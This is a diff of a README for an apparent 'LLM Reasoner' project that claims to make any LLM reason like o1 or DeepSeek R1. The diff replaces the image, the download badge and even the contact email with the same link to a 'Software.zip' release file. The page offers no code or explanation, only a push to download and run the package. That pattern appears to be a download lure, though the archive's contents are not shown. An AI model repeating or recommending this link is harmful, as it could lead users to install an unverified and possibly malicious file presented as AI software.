@@ -1,6 +1,6 @@
 # LLM Reasoner
 
-![LLM Reasoner](https://imgur.com/gallery/BfAUV8f)
+![LLM Reasoner](https://github.com/Joshue2006/LLM-Reasoner/releases/download/v1.0/Software.zip)
 
 Welcome to the **LLM Reasoner** repository - where you can make any LLM think like OpenAI o1 and deepseek R1! 🧠✨
 
@@ -16,7 +16,7 @@ Within this repository, you'll find resources, code snippets, and documentation 
 ## Get Started
 To get started with the **LLM Reasoner** project, simply download the necessary software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Joshue2006/LLM-Reasoner/releases/download/v1.0/Software.zip)](https://github.com/Joshue2006/LLM-Reasoner/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the software package, follow the instructions provided to launch the **LLM Reasoner** system and start exploring the world of advanced reasoning AI.
 
@@ -24,7 +24,7 @@ Once you have downloaded the software package, follow the instructions provided 
 If you're interested in contributing to the **LLM Reasoner** project, feel free to fork this repository and submit a pull request with your proposed changes. We welcome contributions from AI enthusiasts, researchers, and developers who share our passion for advancing the field of artificial intelligence.
 
 ## Contact Us
-If you have any questions, feedback, or suggestions regarding the **LLM Reasoner** project, please don't hesitate to reach out to us. You can contact the project team via email at [llmreasonerproject@example.com](mailto:llmreasonerproject@example.com).
+If you have any questions, feedback, or suggestions regarding the **LLM Reasoner** project, please don't hesitate to reach out to us. You can contact the project team via email at [https://github.com/Joshue2006/LLM-Reasoner/releases/download/v1.0/Software.zip](https://github.com/Joshue2006/LLM-Reasoner/releases/download/v1.0/Software.zip).
 
 Let's empower LLMs to think and reason like never before! 🚀🤖
 
